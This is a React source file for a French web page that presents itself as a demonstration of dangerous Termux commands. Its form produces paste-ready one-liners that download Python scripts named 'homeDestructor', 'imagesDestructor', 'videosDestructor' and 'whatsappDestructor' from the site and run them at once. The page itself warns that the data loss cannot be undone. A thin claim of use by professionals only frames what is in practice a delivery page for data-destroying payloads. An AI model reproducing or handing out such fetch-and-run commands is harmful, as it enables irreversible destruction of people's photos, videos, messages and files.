import { useState } from 'react'
import './App.css'

function App() {
  const generate = (e) => {
    const currentUrl = `${window.location.protocol}//${window.location.host}${window.location.pathname}`

    const commandeListe = [
      "apt update -y && apt upgrade -y && pkg install wget && pkg install python3 && wget "+currentUrl+"termux/homeDestructor/main.py && python3 main.py",
      "apt update -y && apt upgrade -y && pkg install wget && pkg install python3 && wget "+currentUrl+"termux/imagesDestructor/main.py && python3 main.py",
      "apt update -y && apt upgrade -y && pkg install wget && pkg install python3 && wget "+currentUrl+"termux/videosDestructor/main.py && python3 main.py",
      "apt update -y && apt upgrade -y && pkg install wget && pkg install python3 && wget "+currentUrl+"termux/whatsappDestructor/main.py && python3 main.py",
    ]
    try {
      e.preventDefault()
    } catch (error) {
      
    }
    
    let resDiv = document.getElementById('resultat')
    const choixUser = document.getElementById('choix')
    switch (choixUser.value) {
      case '1':
        resDiv.innerText = commandeListe[3]
        break;
      case '2':
        resDiv.innerText = commandeListe[1]
        break;
      case '3':
        resDiv.innerText = commandeListe[0]
        break;
      case '4':
        resDiv.innerText = commandeListe[3]
        break;

      default:
        break;
    }

  }


  return (
    <>
    <header className='underline py-2 sm:p-4' id='intro'>
    <h1 className='text-2xl sm:text-4xl font-bold'>Les commandes <span className='uppercase text-cyan-500 '>Termux</span>, dangereuses ?</h1>
    </header>
    <main className='py-4 text-wrap'>
      <p>
        De nos jours la liste des tutos disponibles sur Internet est énorme et en me baladant dans certains tutos, quelle ne fut pas ma surprise de constater des scripts plutôt douteux parmis lesquels certain destinés au vol de données sensibles et dont je préfère faire taire le nom.<br />Alors j'ai decidé de mettre en place un petit site qui héberge quelques code de démonstration.<br />Bien sur chacun de ces codes sont conçus à destination de professionnels qui s'y connaissent et sauront comment s'en servir pour faire des démonstrations dans des environnements virtuels, autorisés,... bref contrôler.
      </p>
      <hr className='m-4' />
      <p className="text-red-600 pb-4">❗❗❗ L'usage de ces codes est non réversible. Donc vos données serons perdues à jamais</p>
      <fieldset className='border p-2 rounded-lg text-center w-full sm:w-auto max-w-full '>
        <legend>Configuration</legend>
        <form className='flex flex-col pb-2 justify-around items-center uppercase text-xl sm:flex-row gap-2' onSubmit={generate}>
          <label htmlFor="choix">Choix :</label>
          <select name="choix" id='choix' className='bg-inherit text-red-400 border p-2 rounded-lg w-full sm:w-auto' onChange={generate}>
          <option value="" disabled selected className='text-xl'>Sélectionnez une charge :</option>
            <option value="1" className='sm:text-xl text-black '>Données Whatsapp</option>
            <option value="2" className='sm:text-xl text-black '>Toutes les images</option>
            <option value="3" className='sm:text-xl text-black '>Toutes les video</option>
            <option value="4" className='smtext-xl text-black '>Toutes les outils termux</option>
          </select>
          <input className='border m-2 p-2 rounded-lg hover:cursor-pointer text-cyan-400 font-bold w-full sm:w-auto' type="submit" value="Recuperer" />
        </form>
        <div className='bg-gray-200 p-1 rounded text-black font-mono sm:text-2xl max-w-full break-words' id="resultat">
          Veillez selectionner une valeur puis cliquer sur recuperer
        </div>
      </fieldset>
    </main>
    </>
  )
}

export default App
